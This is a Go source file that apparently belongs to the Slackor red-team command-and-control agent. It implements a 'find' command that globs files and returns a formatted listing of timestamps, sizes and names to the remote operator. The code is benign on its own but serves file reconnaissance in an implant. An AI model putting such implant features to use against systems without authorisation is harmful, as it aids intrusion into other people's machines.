package common

import (
	"errors"
	"fmt"
	"os"

	"github.com/Coalfire-Research/Slackor/pkg/command"
	"github.com/bmatcuk/doublestar"
	"github.com/dustin/go-humanize"
)

// Find searches the current directory for the glob
type Find struct{}

// Name is the name of the command
func (f Find) Name() string {
	return "find"
}

// Run searches the current directory for the glob
func (f Find) Run(clientID string, jobID string, args []string) (string, error) {
	if len(args) != 1 {
		return "", errors.New("find takes 1 argument")
	}
	glob := args[0]
	if glob == "" {
		return "No matches.", nil
	}
	filenames, err := doublestar.Glob(glob)
	if err != nil {
		return "", errors.New("invalid glob pattern")
	}
	var result string
	if len(filenames) > 0 {
		for _, filename := range filenames {
			f, err := os.Stat(filename)
			if err != nil {
				// If we can't stat the file for some reason, don't prevent other results from being returned
				result = result + fmt.Sprintf("%-28v", "n/a") + "   <ERR>    " + fmt.Sprintf("%-9v", "n/a") + "     " + filename + "\n"
				continue
			}
			size := humanize.IBytes(uint64(f.Size()))
			timestamp := f.ModTime()
			ts := timestamp.Format("01/02/2006 3:04:05 PM MST")
			dir := "            "
			if f.IsDir() {
				dir = "   <DIR>    "
			}
			result = result + fmt.Sprintf("%-28v", ts) + dir + fmt.Sprintf("%-9v", size) + "     " + filename + "\n"
		}
	} else {
		return "No matches.", nil
	}
	return result, nil
}

func init() {
	command.RegisterCommand(Find{})
}
